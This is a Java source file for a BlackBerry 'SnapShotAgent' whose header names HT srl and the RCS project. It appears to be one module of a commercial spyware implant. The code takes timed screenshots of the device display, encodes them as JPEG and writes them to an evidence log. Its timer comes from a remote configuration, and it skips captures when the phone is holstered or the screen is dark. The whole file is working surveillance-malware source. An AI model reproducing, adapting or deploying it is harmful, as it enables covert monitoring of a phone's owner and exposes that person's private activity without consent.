//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : SnapShotAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import java.io.EOFException;

import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.Bitmap;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.system.Display;
import net.rim.device.api.system.EncodedImage;
import net.rim.device.api.system.JPEGEncodedImage;
import net.rim.device.api.util.DataBuffer;
import blackberry.log.Log;
import blackberry.log.LogType;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * TODO : evitare lo snapshot se l'immagine e' nera. Cominciare a vedere se e'
 * in holster.
 * 
 * @author user1
 */
public final class SnapShotAgent extends Agent {
    //#ifdef DEBUG
    static Debug debug = new Debug("SnapShotAgent", DebugLevel.NOTIFY);
    //#endif

    private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 50;
    private static final int LOG_SNAPSHOT_VERSION = 2009031201;
    private static final int MIN_TIMER = 30 * 1000;

    private int timerMillis = 60 * 1000;
    private boolean onNewWindow = false;

    /**
     * Instantiates a new snap shot agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public SnapShotAgent(final boolean agentStatus) {
        super(Agent.AGENT_SNAPSHOT, agentStatus, true, "SnapShotAgent");
        //#ifdef DBC
        Check.asserts(Log.convertTypeLog(agentId) == LogType.SNAPSHOT,
                "Wrong Conversion");
        //#endif
    }

    /**
     * Instantiates a new snap shot agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected SnapShotAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    // se e' in standby non prendi la snapshot
    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {

        //#ifdef DEBUG_INFO
        debug.info("Taking snapshot");

        //#endif

        if (DeviceInfo.isInHolster()) {
            //#ifdef DEBUG_INFO
            debug.info("In Holster, skipping snapshot");
            //#endif
            return;
        }

        if (!Backlight.isEnabled()) {
            //#ifdef DEBUG_INFO
            debug.info("No backlight, skipping snapshot");
            //#endif
            return;
        }

        final int width = Display.getWidth();
        final int height = Display.getHeight();

        final Bitmap bitmap;
        if(Display.getOrientation()==Display.ORIENTATION_PORTRAIT){
            bitmap = new Bitmap(width, height);
        }else{
            bitmap = new Bitmap(height,width);
        }        
        
        Display.screenshot(bitmap);

        // int size = width * height;
        /*
         * int[] argbData = new int[size]; bitmap.getARGB(argbData, 0, width, 0,
         * 0, width, height);
         */
        // EncodedImage encoded = PNGEncodedImage.encode(bitmap);
        final EncodedImage encoded = JPEGEncodedImage.encode(bitmap,
                SNAPSHOT_DEFAULT_JPEG_QUALITY);
        final byte[] plain = encoded.getData();

        /*
         * AutoFlashFile file = new AutoFlashFile(Path.SD_PATH + "snapshot.jpg",
         * false); if (file.exists()) { file.delete(); } file.create();
         * file.write(plain);
         */

        //#ifdef DBC
        Check.requires(log != null, "Null log");
        //#endif

        synchronized (log) {
            log.createLog(getAdditionalData());
            log.writeLog(plain);
            log.close();
        }

        //#ifdef DEBUG_TRACE
        debug.trace("finished run");

        //#endif

    }

    private byte[] getAdditionalData() {
        final String window = "Desktop";

        final int wlen = window.length() * 2;
        final int tlen = wlen + 24;
        final byte[] additionalData = new byte[tlen];

        final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen,
                false);

        databuffer.writeInt(LOG_SNAPSHOT_VERSION); // version
        databuffer.writeInt(0); // process name len
        databuffer.writeInt(wlen); // windows name len

        byte[] windowsName = new byte[wlen];
        windowsName = WChar.getBytes(window);
        databuffer.write(windowsName);

        //#ifdef DBC
        Check.asserts(windowsName.length == wlen, "Wrong windows name");
        Check.ensures(additionalData.length == tlen,
                "Wrong additional data name");
        //#endif

        //#ifdef DEBUG_TRACE
        debug.trace("Additional data len: " + additionalData.length);

        //#endif

        return additionalData;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        //#ifdef DBC
        Check.asserts(confParameters != null, "Null confParameters");
        //#endif

        final DataBuffer databuffer = new DataBuffer(confParameters, 0,
                confParameters.length, false);

        try {

            int value = databuffer.readInt();

            if (value >= MIN_TIMER) {
                timerMillis = value;
            }

            value = databuffer.readInt();
            onNewWindow = (value == 1);
            //#ifdef DEBUG_TRACE
            debug.trace("onNewWindow: " + onNewWindow);
            //#endif

        } catch (final EOFException e) {
            //#ifdef DEBUG
            debug.error("params FAILED");
            //#endif
            return false;
        }

        setPeriod(timerMillis);
        setDelay(timerMillis);

        //#ifdef DEBUG_INFO
        debug.info("timer: " + timerMillis);

        //#endif

        return true;
    }

}
